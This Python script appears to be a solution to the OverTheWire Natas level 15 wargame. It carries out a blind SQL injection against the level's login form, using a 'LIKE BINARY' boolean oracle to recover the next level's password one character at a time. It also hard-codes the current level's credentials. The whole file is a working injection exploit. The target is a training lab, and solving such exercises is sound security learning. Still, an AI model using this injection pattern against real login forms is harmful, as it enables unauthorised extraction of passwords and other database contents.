import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=1'
data_fmt = 'username=natas16" AND password LIKE BINARY "{}%" -- -'
basic_auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
alphabet = string.ascii_letters + string.digits
successful_query_crib = "This user exists."

def attempt(password_fragment):
    print("Trying", password_fragment)

    response = (
        requests.post(
            url,
            data=data_fmt.format(password_fragment),
            auth=basic_auth,
            proxies={"http": "http://127.0.0.1:8080"},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
            },
        ).text
    )

    if successful_query_crib in response:
        return True

    return False


def run_password_oracle():
    verified_password = ""

    for i in range(64):
        for character in alphabet:
            if attempt(verified_password + character):
                verified_password += character
                break
            elif character == alphabet[-1]:
                return verified_password

    return verified_password


if __name__ == "__main__":
    print(run_password_oracle())
